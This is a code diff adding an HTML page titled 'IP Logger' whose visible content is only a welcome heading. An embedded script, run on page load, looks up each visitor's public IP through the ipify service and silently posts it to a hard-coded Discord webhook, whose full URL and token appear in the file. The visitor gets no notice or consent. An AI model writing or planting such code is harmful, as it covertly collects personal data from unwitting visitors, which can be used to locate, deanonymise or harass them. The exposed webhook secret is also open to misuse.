@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome to my website!</h1>
+
+    <script>
+        // Discord webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1289039968446189651/NH1uDrnOTeFDUwuqy4H8cUk7HgDg-gmaxN8kODB1s8NR5OzVjcom5yrX23R7Shq8r32g';
+
+        // Fetch the user's public IP address using ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                
+                // Send the IP to Discord webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `Visitor IP: ${userIP}`
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('IP sent to Discord successfully');
+                    } else {
+                        console.error('Error sending IP to Discord');
+                    }
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+            });
+    </script>
+</body>
+</html>
